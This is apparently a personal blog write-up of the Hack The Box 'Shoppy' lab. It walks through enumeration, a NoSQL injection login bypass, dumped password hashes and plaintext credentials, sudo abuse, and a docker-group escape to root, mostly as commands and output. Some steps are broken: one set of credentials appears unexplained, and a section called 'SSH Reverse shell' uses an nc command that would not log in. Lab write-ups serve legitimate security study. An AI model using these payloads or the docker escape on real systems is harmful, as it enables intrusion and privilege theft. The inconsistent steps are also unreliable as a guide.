+++
author = ['Abdallah Adham']
title = "Shoppy HTB Writeup"
date = 2022-11-08
description = "This is a writeup of the Shoppy machine in Hack The Box platform."
draft = false
slug = ""

tags = [
	'HackTheBox',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Shoppy_HTB/shoppy_htb.png"
+++

---

## Scanning 

```bash
─$ nmap 10.10.11.180 -A -oN nmap.txt 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 08:19 EST
Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:07 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 08:20 (0:00:00 remaining)
Nmap scan report for 10.10.11.180
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
```

## Enumeration

### Subdomain Enumeration

```bash
─$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.shoppy.htb" -u http://shoppy.htb -t 10 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 123ms]
:: Progress: [100000/100000] :: Job [1/1] :: 64 req/sec :: Duration: [0:22:27] :: Errors: 0 ::
```
### Directory Enumeration

$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shoppy.htb/FUZZ

images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 157ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 124ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 85ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 90ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 83ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 88ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 86ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 439ms]
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 96ms]
exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 160ms]
                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 87ms]
LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 143ms]
LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms]
:: Progress: [220560/220560] :: Job [1/1] :: 443 req/sec :: Duration: [0:09:27] :: Errors: 0 ::

## Exploitation

### NoSQL Injection

```txt
username= admin'||'1==1
password= anything
```

```json
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
 {"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
 
```


### Hash Decryption

```txt
Josh Account:

Hash: 6ebcea65320589ca4f2f1ce039975995

type: md5

result: remembermethisway
```


### SSH Reverse shell

```bash
Jaeger account:
username: jaeger
password: Sh0ppyBest@pp!

─$ nc jaeger@shoppy.htb
jaeger@shoppy.htb password: Sh0ppyBest@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  8 05:53:00 2022 from 10.10.14.38
jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos

```

#### User.txt
```bash
jaeger@shoppy:~$ cat user.txt 
b43c5028ab833b5XXXXXXXXXXXXXX
```

## Privilage Escalation

### Sudo -l

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```


```bash 
jaeger@shoppy:~$ cat /home/deploy/password-manager

Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !

```

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

```bash
$ ssh deploy@shoppy.htb 
deploy@shoppy.htb password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  8 06:04:57 2022 from 10.10.14.38
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
$ cat root.txt
e65b2ace8ff78062XXXXXXXXXXXX
```

_Pwned_
![pwned](post/Shoppy_HTB/imgs/Shoppy/1.png)